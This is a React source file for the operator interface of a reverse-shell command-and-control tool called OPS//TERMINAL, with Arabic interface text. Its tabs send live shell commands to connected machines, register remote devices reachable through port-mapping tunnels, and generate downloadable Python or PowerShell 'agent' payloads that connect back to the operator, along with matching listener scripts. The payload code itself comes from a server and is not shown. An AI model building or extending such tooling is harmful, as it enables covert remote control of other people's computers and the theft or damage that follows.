import { useState, useEffect, useRef } from 'react';

const G = '#00ff66';
const GD = 'rgba(0,255,102,0.4)';
const RED = '#ff3355';
const BG = '#030a06';

const S = {
  wrap: { maxWidth: 840, margin: '0 auto', padding: '32px 20px', fontFamily: "'JetBrains Mono',monospace", color: '#b0ffd0', minHeight: '100vh', position: 'relative', zIndex: 1 },
  center: { display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh' },
  logo: { fontSize: 28, fontWeight: 700, color: G, textShadow: `0 0 14px ${GD},0 0 40px ${GD}`, marginBottom: 4 },
  sub: { fontSize: 11, color: '#4a7a5c', letterSpacing: 4, marginBottom: 36 },
  card: { border: `1px solid ${GD}`, borderRadius: 6, padding: 28, width: 400, background: 'rgba(2,12,6,0.85)', boxShadow: `0 0 28px rgba(0,255,102,0.05) inset` },
  cardTitle: { fontSize: 12, color: G, letterSpacing: 1, marginBottom: 18 },
  lbl: { display: 'flex', flexDirection: 'column', gap: 5, fontSize: 11, color: '#6aaa80', marginBottom: 14 },
  prompt: { color: G, opacity: 0.85 },
  inp: { background: '#020d05', color: '#b0ffd0', border: `1px solid #0e5c2c`, borderRadius: 4, padding: '10px 12px', fontSize: 14, outline: 'none', fontFamily: 'inherit' },
  btn: { background: 'transparent', color: G, border: `1px solid ${G}`, borderRadius: 4, padding: '10px 24px', fontSize: 14, cursor: 'pointer', fontFamily: 'inherit', letterSpacing: 1, boxShadow: `0 0 10px ${GD}`, marginTop: 6 },
  btnRed: { background: 'transparent', color: RED, border: `1px solid ${RED}`, borderRadius: 4, padding: '10px 24px', fontSize: 14, cursor: 'pointer', fontFamily: 'inherit', letterSpacing: 1, boxShadow: `0 0 10px rgba(255,51,85,0.3)` },
  btnSm: { background: 'transparent', color: G, border: `1px solid #0e5c2c`, borderRadius: 4, padding: '7px 14px', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit', letterSpacing: 1 },
  err: { color: RED, fontSize: 12, marginTop: 10, textShadow: `0 0 6px rgba(255,51,85,0.4)` },
  header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 18 },
  tabs: { display: 'flex', gap: 10, borderBottom: `1px solid #0e5c2c`, paddingBottom: 12, marginBottom: 18 },
  tab: (a) => ({ background: 'transparent', color: a ? G : '#4a7a5c', border: 'none', borderBottom: a ? `2px solid ${G}` : '2px solid transparent', padding: '8px 14px', fontSize: 12, cursor: 'pointer', letterSpacing: 1, fontFamily: 'inherit', textShadow: a ? `0 0 8px ${GD}` : undefined }),
  panel: { border: `1px solid ${GD}`, borderRadius: 6, padding: 18, marginBottom: 16, background: 'rgba(2,12,6,0.85)', boxShadow: `0 0 24px rgba(0,255,102,0.04) inset` },
  panelTitle: { fontSize: 12, color: G, letterSpacing: 1, marginBottom: 10 },
  fieldRow: { display: 'flex', gap: 12, flexWrap: 'wrap' },
  log: { background: '#010302', color: G, border: `1px solid #0a3a1a`, borderRadius: 4, padding: 12, maxHeight: 340, overflow: 'auto', direction: 'ltr', textAlign: 'left', fontSize: 12, lineHeight: 1.7, whiteSpace: 'pre-wrap', wordBreak: 'break-all' },
  code: { background: '#010302', color: G, border: `1px solid #0a3a1a`, borderRadius: 4, padding: 12, maxHeight: 360, overflow: 'auto', direction: 'ltr', textAlign: 'left', fontSize: 11, lineHeight: 1.5 },
  cursor: { display: 'inline-block', animation: 'blink 1s step-end infinite' },
  footer: { textAlign: 'center', fontSize: 10, color: '#2a5a3a', letterSpacing: 1, marginTop: 28 },
  online: { display: 'inline-block', width: 8, height: 8, borderRadius: '50%', background: G, boxShadow: `0 0 8px ${G}`, animation: 'pulse 1.5s infinite', marginRight: 6, verticalAlign: 'middle' },
};

function copyText(t) {
  if (navigator.clipboard?.writeText) navigator.clipboard.writeText(t);
  else { const x = document.createElement('textarea'); x.value = t; document.body.appendChild(x); x.select(); document.execCommand('copy'); x.remove(); }
}

function downloadText(t, name) {
  const b = new Blob([t], { type: 'text/plain;charset=utf-8' });
  const u = URL.createObjectURL(b);
  const a = document.createElement('a'); a.href = u; a.download = name; a.click();
  URL.revokeObjectURL(u);
}

export default function App() {
  const [auth, setAuth] = useState(null);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    fetch('/api/auth/me').then(r => r.ok ? r.json() : null).then(d => setAuth(d)).catch(() => null).finally(() => setChecking(false));
  }, []);

  if (checking) return <div style={{ ...S.wrap, textAlign: 'center', paddingTop: 140 }}><span style={{ color: G }}>root@ops:~#</span> loading...<span style={S.cursor}>▌</span></div>;

  return auth ? <Dashboard auth={auth} onLogout={() => setAuth(null)} /> : <Login onLogin={setAuth} />;
}

function Login({ onLogin }) {
  const [port, setPort] = useState('');
  const [error, setError] = useState('');
  const [busy, setBusy] = useState(false);

  async function submit(e) {
    e.preventDefault();
    setError('');
    setBusy(true);
    try {
      const r = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ port: Number(port) }),
      });
      const j = await r.json();
      if (!r.ok) return setError(j.error || 'error');
      onLogin({ port: j.port, host: '' });
    } catch { setError('connection failed'); }
    finally { setBusy(false); }
  }

  return (
    <div style={S.center}>
      <div style={{ marginBottom: 28, textAlign: 'center' }}>
        <div style={S.logo}>OPS//TERMINAL</div>
        <div style={S.sub}>REVERSE-CHANNEL CONTROL GRID</div>
      </div>
      <form onSubmit={submit} style={S.card}>
        <div style={S.cardTitle}>{'>'}_ SESSION_INIT</div>
        <div style={{ fontSize: 11, color: '#3a6a4a', marginBottom: 16 }}>
          أدخل رقم منفذ الاستماع (LISTENER_PORT) الذي شغّلته على جهازك فقط.
        </div>
        <label style={S.lbl}>
          <span style={S.prompt}>{'>'}_ LISTENER_PORT</span>
          <input style={{ ...S.inp, direction: 'ltr' }} type="number" value={port} onChange={e => setPort(e.target.value)} placeholder="9000" min="1" max="65535" required />
        </label>
        {error && <div style={S.err}>[!] {error}</div>}
        <button type="submit" style={S.btn} disabled={busy}>
          {busy ? 'CONNECTING...' : 'AUTHENTICATE '}
          <span style={S.cursor}>▌</span>
        </button>
      </form>
      <div style={S.footer}>▓ OPS//TERMINAL v2.0 — AUTHORIZED USE ONLY ▓</div>
    </div>
  );
}

function Dashboard({ auth, onLogout }) {
  const [tab, setTab] = useState('terminal');
  const [cmd, setCmd] = useState('');
  const [log, setLog] = useState([]);
  const [error, setError] = useState('');
  const [busy, setBusy] = useState(false);
  const logRef = useRef(null);

  useEffect(() => { logRef.current?.scrollTo({ top: logRef.current.scrollHeight }); }, [log]);

  function pushLog(text, kind = 'out') {
    setLog(p => [...p, { t: Date.now(), text, kind }].slice(-400));
  }

  async function sendCmd() {
    const c = cmd.trim();
    if (!c) return;
    setCmd('');
    pushLog(`> ${c}`, 'cmd');
    setError('');
    setBusy(true);
    try {
      const r = await fetch('/api/tcp/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: c }),
      });
      const j = await r.json();
      if (!r.ok) { setError(j.error || 'command failed'); return; }
      if (j.ok) pushLog(j.output || '(empty)', 'out');
    } catch { setError('request failed'); }
    finally { setBusy(false); }
  }

  async function logout() {
    await fetch('/api/auth/logout', { method: 'POST' }).catch(() => {});
    onLogout();
  }

  return (
    <div style={S.wrap}>
      <header style={S.header}>
        <div style={{ fontSize: 14, color: G }}>
          <span style={S.online} />
          root@ops:~#<span style={{ color: '#3a6a4a' }}> listener ::{auth.port}</span>
        </div>
        <button onClick={logout} style={{ ...S.btnSm, color: RED, borderColor: RED }}>EXIT</button>
      </header>

      <nav style={S.tabs}>
        <button type="button" onClick={() => setTab('devices')} style={S.tab(tab === 'devices')}>[1] DEVICES</button>
        <button type="button" onClick={() => setTab('terminal')} style={S.tab(tab === 'terminal')}>[2] TERMINAL</button>
        <button type="button" onClick={() => setTab('payload')} style={S.tab(tab === 'payload')}>[3] PAYLOAD</button>
      </nav>

      {error && <div style={S.err}>[!] {error}</div>}

      {tab === 'devices' ? (
        <DevicesTab />
      ) : tab === 'terminal' ? (
        <section>
          <div style={S.panel}>
            <div style={S.panelTitle}>$ command.execute --live (عبر المستمع ::{auth.port})</div>
            <pre ref={logRef} style={S.log}>
              {log.length === 0
                ? '// بانتظار الأوامر...\n// اكتب أمراً مثل: whoami / dir / hostname\n'
                : log.map(l => {
                    const ts = new Date(l.t).toLocaleTimeString('ar-EG');
                    if (l.kind === 'cmd') return `${ts} > ${l.text}`;
                    return `${ts} ${l.text}`;
                  }).join('\n')}
            </pre>
            <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
              <input
                style={{ ...S.inp, flex: 1, direction: 'ltr' }}
                value={cmd}
                onChange={e => setCmd(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && sendCmd()}
                placeholder="أدخل أمراً، مثال: whoami"
                disabled={busy}
              />
              <button onClick={sendCmd} style={{ ...S.btnSm, flexShrink: 0 }} disabled={busy || !cmd.trim()}>
                {busy ? 'RUN...' : 'SEND'}
              </button>
            </div>
          </div>
        </section>
      ) : (
        <PayloadTab auth={auth} />
      )}

      <footer style={S.footer}>▓ OPS//TERMINAL v2.0 — AUTHORIZED USE ONLY ▓</footer>
    </div>
  );
}

function DevicesTab() {
  const [devices, setDevices] = useState([]);
  const [selected, setSelected] = useState(null);
  const [form, setForm] = useState({ name: '', host: '', port: '' });
  const [cmd, setCmd] = useState('');
  const [out, setOut] = useState('');
  const [error, setError] = useState('');
  const [busy, setBusy] = useState(false);

  async function refresh() {
    const r = await fetch('/api/devices');
    if (r.ok) setDevices(await r.json());
  }

  useEffect(() => { refresh(); }, []);

  async function addDevice(e) {
    e.preventDefault();
    setError('');
    setBusy(true);
    try {
      const r = await fetch('/api/devices', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form),
      });
      const j = await r.json();
      if (!r.ok) return setError(j.error || 'failed');
      setForm({ name: '', host: '', port: '' });
      await refresh();
    } catch { setError('failed'); }
    finally { setBusy(false); }
  }

  async function removeDevice(id) {
    await fetch('/api/devices/' + id, { method: 'DELETE' });
    if (selected === id) setSelected(null);
    await refresh();
  }

  async function selectDevice(id) {
    setSelected(id); setOut(''); setCmd('');
  }

  async function ping(id) {
    setError(''); setBusy(true);
    try {
      const r = await fetch('/api/devices/' + id + '/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
      const j = await r.json();
      if (!r.ok) { setError(j.error || 'offline'); return; }
      setOut('PING OK\n' + (j.output || ''));
      await refresh();
    } catch { setError('ping failed'); }
    finally { setBusy(false); }
  }

  async function sendDeviceCmd() {
    const c = cmd.trim();
    if (!c) { setError('enter a command'); return; }
    setError('');
    setBusy(true);
    try {
      const r = await fetch('/api/devices/' + selected + '/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: c }),
      });
      const j = await r.json();
      if (!r.ok) { setError(j.error || 'failed'); return; }
      setOut(j.output || '(empty)');
      await refresh();
    } catch { setError('failed'); }
    finally { setBusy(false); }
  }

  function rel(id) {
    const d = devices.find(x => x.id === id);
    if (!d) return 'offline';
    if (!d.lastSeen) return 'offline';
    return (Date.now() - d.lastSeen) < 60000 ? d.lastStatus : 'offline';
  }

  return (
    <div>
      <div style={S.panel}>
        <div style={S.panelTitle}>$ devices.register --registry</div>
        <form onSubmit={addDevice} style={{ ...S.fieldRow, alignItems: 'flex-end' }}>
          <label style={{ ...S.lbl, flex: 1 }}>
            <span style={S.prompt}>{'>'}_ NAME</span>
            <input style={{ ...S.inp, direction: 'ltr' }} value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} placeholder="PC-01" />
          </label>
          <label style={{ ...S.lbl, flex: 1 }}>
            <span style={S.prompt}>{'>'}_ HOST</span>
            <input style={{ ...S.inp, direction: 'ltr' }} value={form.host} onChange={e => setForm({ ...form, host: e.target.value })} placeholder="fodfht-61960.portmap.host" required />
          </label>
          <label style={{ ...S.lbl, flex: 0.5 }}>
            <span style={S.prompt}>{'>'}_ PORT</span>
            <input style={{ ...S.inp, direction: 'ltr' }} type="number" value={form.port} onChange={e => setForm({ ...form, port: e.target.value })} placeholder="61960" min="1" max="65535" required />
          </label>
          <button type="submit" style={{ ...S.btnSm, flexShrink: 0 }} disabled={busy}>REGISTER</button>
        </form>
        {error && <div style={S.err}>[!] {error}</div>}
      </div>

      <div style={S.panel}>
        <div style={S.panelTitle}>$ devices.list</div>
        {devices.length === 0 ? (
          <div style={{ fontSize: 12, color: '#3a6a4a' }}>// لا أجهزة مسجلة. سجّل جهازاً أعلاه.</div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {devices.map(d => {
              const st = rel(d.id);
              return (
                <div key={d.id} style={{ border: `1px solid ${st === 'online' ? '#00ff66' : '#0e5c2c'}`, borderRadius: 4, padding: '10px 12px', display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                  <span style={{ width: 8, height: 8, borderRadius: '50%', background: st === 'online' ? G : '#355a45', boxShadow: st === 'online' ? `0 0 8px ${G}` : 'none', flexShrink: 0 }} />
                  <div style={{ flex: 1, minWidth: 220 }}>
                    <div style={{ color: G, fontSize: 13 }}>{d.name || 'UNNAMED'}</div>
                    <div style={{ fontSize: 11, color: '#6aaa80' }}>{d.host}:{d.port}</div>
                    <div style={{ fontSize: 10, color: '#3a6a4a' }}>{st}{d.lastSeen ? ' · ' + new Date(d.lastSeen).toLocaleTimeString('ar-EG') : ''}</div>
                  </div>
                  <button style={S.btnSm} onClick={() => selectDevice(d.id)}>SELECT</button>
                  <button style={S.btnSm} onClick={() => ping(d.id)} disabled={busy}>PING</button>
                  <button style={{ ...S.btnSm, color: RED, borderColor: RED }} onClick={() => removeDevice(d.id)}>DEL</button>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {selected && (() => {
        const d = devices.find(x => x.id === selected);
        if (!d) return null;
        return (
          <div style={S.panel}>
            <div style={S.panelTitle}>$ control :: {d.name || d.host}</div>
            <div style={{ display: 'flex', gap: 8, marginBottom: 10 }}>
              <input
                style={{ ...S.inp, flex: 1, direction: 'ltr' }}
                value={cmd}
                onChange={e => setCmd(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && sendDeviceCmd()}
                placeholder="أمر، مثال: whoami / dir"
              />
              <button style={S.btnSm} onClick={sendDeviceCmd} disabled={busy || !cmd.trim()}>{busy ? 'RUN...' : 'SEND'}</button>
            </div>
            <pre style={S.log}>{out || '// اختر أمراً وأرسله لهذا الجهاز.'}</pre>
          </div>
        );
      })()}
    </div>
  );
}

function PayloadTab({ auth }) {
  const [lang, setLang] = useState('python');
  const [agentHost, setAgentHost] = useState('');
  const [agentPort, setAgentPort] = useState('');
  const [agentOut, setAgentOut] = useState(null);
  const [listenerOut, setListenerOut] = useState(null);
  const [error, setError] = useState('');
  const [busy, setBusy] = useState('');

  async function genAgent() {
    setError('');
    const h = agentHost.trim();
    const p = Number(agentPort);
    if (!h) return setError('AGENT_HOST required');
    if (!Number.isInteger(p) || p <= 0 || p > 65535) return setError('AGENT_PORT invalid');
    setBusy('agent');
    try {
      const r = await fetch('/api/payload/generate', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ language: lang, host: h, port: p }),
      });
      const j = await r.json();
      if (!r.ok) return setError(j.error);
      setAgentOut(j);
    } catch { setError('failed'); }
    finally { setBusy(''); }
  }

  async function genListener() {
    setError(''); setBusy('listener');
    try {
      const r = await fetch('/api/payload/listener', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
      const j = await r.json();
      if (!r.ok) return setError(j.error);
      setListenerOut(j);
    } catch { setError('failed'); }
    finally { setBusy(''); }
  }

  return (
    <div>
      <div style={S.panel}>
        <div style={S.panelTitle}>$ payload.build --reverse-channel</div>
        <div style={{ fontSize: 11, color: '#3a6a4a', marginBottom: 14 }}>
          أدخل المضيف والمنفذ اللذين يصل بهما الوكيل إلى نفقك على جهازك. الوكيل سيعود نحو {agentHost || 'HOST'}:{agentPort || 'PORT'}.
        </div>
        <div style={S.fieldRow}>
          <label style={{ ...S.lbl, flex: 1 }}>
            <span style={S.prompt}>{'>'}_ AGENT_HOST</span>
            <input style={{ ...S.inp, direction: 'ltr' }} value={agentHost} onChange={e => setAgentHost(e.target.value)} placeholder="fodfht-61960.portmap.host" required />
          </label>
          <label style={{ ...S.lbl, flex: 1 }}>
            <span style={S.prompt}>{'>'}_ AGENT_PORT</span>
            <input style={{ ...S.inp, direction: 'ltr' }} type="number" value={agentPort} onChange={e => setAgentPort(e.target.value)} placeholder="61960" min="1" max="65535" required />
          </label>
          <label style={{ ...S.lbl, flex: 1 }}>
            <span style={S.prompt}>{'>'}_ LANGUAGE</span>
            <select style={{ ...S.inp, direction: 'ltr' }} value={lang} onChange={e => setLang(e.target.value)}>
              <option value="python">PYTHON</option>
              <option value="powershell">POWERSHELL</option>
            </select>
          </label>
        </div>
        <div style={{ display: 'flex', gap: 10, marginTop: 6 }}>
          <button onClick={genAgent} style={S.btnSm} disabled={busy !== ''}>{busy === 'agent' ? 'BUILDING...' : '$ build agent'}</button>
          <button onClick={genListener} style={S.btnSm} disabled={busy !== ''}>{busy === 'listener' ? 'BUILDING...' : '$ build listener (جهازك، منفذ ' + auth.port + ')'}</button>
        </div>
        {error && <div style={S.err}>[!] {error}</div>}
      </div>

      {listenerOut && (
        <div style={S.panel}>
          <div style={S.panelTitle}>$ {listenerOut.filename} — شغّله على جهازك أولاً (منفذ استماع {auth.port})</div>
          <div style={{ display: 'flex', gap: 8, margin: '8px 0' }}>
            <button style={S.btnSm} onClick={() => copyText(listenerOut.script)}>COPY</button>
            <button style={S.btnSm} onClick={() => downloadText(listenerOut.script, listenerOut.filename)}>DOWNLOAD</button>
          </div>
          <pre style={S.code}>{listenerOut.script}</pre>
        </div>
      )}

      {agentOut && (
        <div style={S.panel}>
          <div style={S.panelTitle}>$ {agentOut.filename} — شغّله على الجهاز البعيد (يعود نحو {agentOut.host}:{agentOut.port})</div>
          <div style={{ display: 'flex', gap: 8, margin: '8px 0' }}>
            <button style={S.btnSm} onClick={() => copyText(agentOut.script)}>COPY</button>
            <button style={S.btnSm} onClick={() => downloadText(agentOut.script, agentOut.filename)}>DOWNLOAD</button>
          </div>
          <pre style={S.code}>{agentOut.script}</pre>
        </div>
      )}
    </div>
  );
}